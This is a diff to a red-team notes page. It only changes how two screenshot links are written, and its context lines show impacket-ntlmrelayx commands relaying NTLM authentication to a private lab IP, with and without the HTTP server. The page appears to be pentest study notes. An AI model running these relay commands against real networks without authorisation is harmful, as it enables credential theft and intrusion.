@@ -8,10 +8,10 @@ grand_parent: Red Team
 ```zsh
 impacket-ntlmrelayx -t 192.168.159.174 -smb2support
 ```
-![](../../../../assets/images/Pasted%20image%2020260501183659.png)
+![[Pasted image 20260501183659.png]]
 
 ### --no-http-server
 ```zsh
 impacket-ntlmrelayx -t 192.168.159.174 -smb2support --no-http-server
 ```
-![](../../../../assets/images/Pasted%20image%2020260501183654.png)
+![[Pasted image 20260501183654.png]]
